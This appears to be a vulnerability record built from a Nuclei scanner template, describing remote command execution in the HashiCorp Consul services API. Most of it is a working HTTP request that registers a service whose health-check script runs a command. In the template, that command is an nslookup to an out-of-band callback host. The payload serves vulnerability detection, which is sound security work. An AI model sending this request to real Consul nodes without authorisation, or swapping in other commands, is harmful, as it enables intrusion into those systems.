# Vulnerability: Hashicorp Consul Services API - Remote Code Execution
**Classification:** CWE-78
**Source:** Nuclei Template (`hashicorp-consul-rce.yaml`)

## Description
Hashicorp Consul Services API is vulnerable to an attack that can be leveraged to perform remote command execution on Consul nodes.

## Vulnerable Code Pattern / Exploit Payload
```http
PUT /v1/agent/service/register HTTP/1.1
Host: {{Hostname}}

{
  "ID": "{{randstr}}",
  "Name": "{{randstr}}",
  "Address": "127.0.0.1",
  "Port": 80,
  "check": {
    "script": "nslookup {{interactsh-url}}",
    "interval": "10s",
    "Timeout": "86400s"
  }
}
```

